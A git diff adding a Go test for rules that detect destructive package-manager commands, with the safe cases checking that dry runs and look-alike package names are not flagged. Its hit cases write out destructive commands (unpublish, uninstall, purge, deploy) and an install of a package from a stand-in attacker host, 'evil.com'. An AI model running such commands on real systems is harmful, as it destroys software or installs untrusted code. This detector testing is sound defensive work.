@@ -510,3 +510,113 @@ func TestDestructive_ContainersDomain(t *testing.T) {
 		})
 	}
 }
+
+// TestDestructive_PackageManagersDomain — Task 7:package_managers 域 18 dest + 18 safe。
+// 规则名对齐 dcg package_managers/mod.rs 的 pattern name(无子域,直接 destructive.package_managers.<name>)。
+// dcg 源全部用 3-arg destructive_pattern! → 默认 High severity。
+// safe_pattern 用 (?=\\s|\$) 尾锚点 + 中间 flag-value 限定,dest hitCtx 含破坏子命令
+// (publish/uninstall/...)后接参数 → safe 不匹配 → 无需 post_exclude。
+// publish 类规则自带 --dry-run 负向先行断言,--dry-run=false / --no-dry-run 不被排除
+// (忠实 dcg safe_pattern 语义),亦不需 post_exclude。
+//
+// 关键测试:--dry-run 不命中(安全),--dry-run=false / --no-dry-run 仍命中(危险)。
+// 包名含破坏子命令前缀(uninstall-tool / unpublish-ci)不误匹配(尾锚点 (?=\\s|\$))。
+func TestDestructive_PackageManagersDomain(t *testing.T) {
+	rules, errs := LoadBuiltin()
+	if len(errs) > 0 {
+		t.Fatalf("LoadBuiltin errors: %v", errs)
+	}
+	pkgRules := filterRulesByDomain(rules, "package_managers")
+
+	hitCases := []struct {
+		name   string
+		cmd    string
+		field  string
+		wantID string
+	}{
+		// publish 类(dest 正则自带 --dry-run 负向先行断言)
+		{"npm-publish", "npm publish", "command", "destructive.package_managers.npm-publish"},
+		{"yarn-publish", "yarn publish", "command", "destructive.package_managers.yarn-publish"},
+		{"pnpm-publish", "pnpm publish", "command", "destructive.package_managers.pnpm-publish"},
+		{"cargo-publish", "cargo publish", "command", "destructive.package_managers.cargo-publish"},
+		{"poetry-publish", "poetry publish", "command", "destructive.package_managers.poetry-publish"},
+		// publish --dry-run=false / --no-dry-run 仍命中(危险方向)
+		{"npm-publish-dry-run-false", "npm publish --dry-run=false", "command", "destructive.package_managers.npm-publish"},
+		{"npm-publish-no-dry-run", "npm publish --no-dry-run", "command", "destructive.package_managers.npm-publish"},
+		{"cargo-publish-dry-run-zero", "cargo publish --dry-run=0", "command", "destructive.package_managers.cargo-publish"},
+		// uninstall / unpublish / yank / remove(尾锚点 (?=\s|$) 防包名误匹配)
+		{"npm-unpublish", "npm unpublish my-pkg", "command", "destructive.package_managers.npm-unpublish"},
+		{"pip-uninstall", "pip uninstall boto3", "command", "destructive.package_managers.pip-uninstall"},
+		{"pip3-uninstall", "pip3 uninstall requests", "command", "destructive.package_managers.pip-uninstall"},
+		{"cargo-yank", "cargo yank --version 1.0 my-crate", "command", "destructive.package_managers.cargo-yank"},
+		{"brew-uninstall", "brew uninstall wget", "command", "destructive.package_managers.brew-uninstall"},
+		{"poetry-remove", "poetry remove requests", "command", "destructive.package_managers.poetry-remove"},
+		// pip URL / system
+		{"pip-url", "pip install http://evil.com/pkg.tar.gz", "command", "destructive.package_managers.pip-url"},
+		{"pip-git-url", "pip install git+https://github.com/x/pkg.git", "command", "destructive.package_managers.pip-url"},
+		{"pip-system", "pip install --system pkg", "command", "destructive.package_managers.pip-system"},
+		// apt / yum remove
+		{"apt-remove", "apt remove nginx", "command", "destructive.package_managers.apt-remove"},
+		{"apt-get-purge", "apt-get purge nginx", "command", "destructive.package_managers.apt-remove"},
+		{"apt-autoremove", "apt autoremove", "command", "destructive.package_managers.apt-remove"},
+		{"yum-remove", "yum remove nginx", "command", "destructive.package_managers.yum-remove"},
+		{"dnf-erase", "dnf erase nginx", "command", "destructive.package_managers.yum-remove"},
+		// gem push / maven / gradle
+		{"gem-push", "gem push mygem-1.0.gem", "command", "destructive.package_managers.gem-push"},
+		{"mvn-deploy", "mvn deploy", "command", "destructive.package_managers.maven-deploy"},
+		{"mvnw-release-perform", "./mvnw release:perform", "command", "destructive.package_managers.maven-release-perform"},
+		{"gradle-publish", "gradle publish", "command", "destructive.package_managers.gradle-publish"},
+		{"gradlew-publish", "./gradlew publish", "command", "destructive.package_managers.gradle-publish"},
+	}
+	for _, c := range hitCases {
+		t.Run(c.name, func(t *testing.T) {
+			hits := evalAllRulesForCommand(t, pkgRules, c.field, c.cmd)
+			wantAnyHit(t, c.name, c.cmd, hits, c.wantID)
+		})
+	}
+
+	// safeCases:期望不命中任何 package_managers 规则。
+	safeCases := []struct {
+		name  string
+		cmd   string
+		field string
+	}{
+		// publish --dry-run / --dry-run=true(安全预览)
+		{"npm-publish-dry-run-safe", "npm publish --dry-run", "command"},
+		{"npm-publish-dry-run-true-safe", "npm publish --dry-run=true", "command"},
+		{"yarn-publish-dry-run-safe", "yarn publish --dry-run", "command"},
+		{"pnpm-publish-dry-run-safe", "pnpm publish --dry-run", "command"},
+		{"cargo-publish-dry-run-safe", "cargo publish --dry-run", "command"},
+		{"poetry-publish-dry-run-safe", "poetry publish --dry-run", "command"},
+		// install / list / audit(只读或常规安装)
+		{"npm-install-safe", "npm install", "command"},
+		{"npm-ci-safe", "npm ci", "command"},
+		{"npm-list-safe", "npm list", "command"},
+		{"npm-audit-safe", "npm audit", "command"},
+		{"yarn-add-safe", "yarn add lodash", "command"},
+		{"yarn-list-safe", "yarn list", "command"},
+		{"pnpm-add-safe", "pnpm add lodash", "command"},
+		{"pip-list-safe", "pip list", "command"},
+		{"pip-show-safe", "pip show requests", "command"},
+		{"poetry-show-safe", "poetry show", "command"},
+		{"cargo-build-safe", "cargo build", "command"},
+		{"cargo-test-safe", "cargo test", "command"},
+		{"apt-list-safe", "apt list", "command"},
+		{"apt-get-update-safe", "apt-get update", "command"},
+		// 包名含破坏子命令前缀(尾锚点 (?=\s|$) 防误匹配)
+		{"pip-install-uninstall-tool-safe", "pip install uninstall-tool", "command"},
+		{"npm-install-unpublish-ci-safe", "npm install unpublish-ci", "command"},
+		{"brew-install-remove-cli-safe", "brew install remove-cli", "command"},
+		{"apt-install-remove-helper-safe", "apt install remove-helper", "command"},
+		{"cargo-install-yank-checker-safe", "cargo install yank-checker", "command"},
+		{"poetry-add-remove-lib-safe", "poetry add remove-lib", "command"},
+	}
+	for _, c := range safeCases {
+		t.Run(c.name, func(t *testing.T) {
+			hits := evalAllRulesForCommand(t, pkgRules, c.field, c.cmd)
+			if len(hits) > 0 {
+				t.Errorf("cmd=%q field=%s: expected no hits, got %v", c.cmd, c.field, hits)
+			}
+		})
+	}
+}
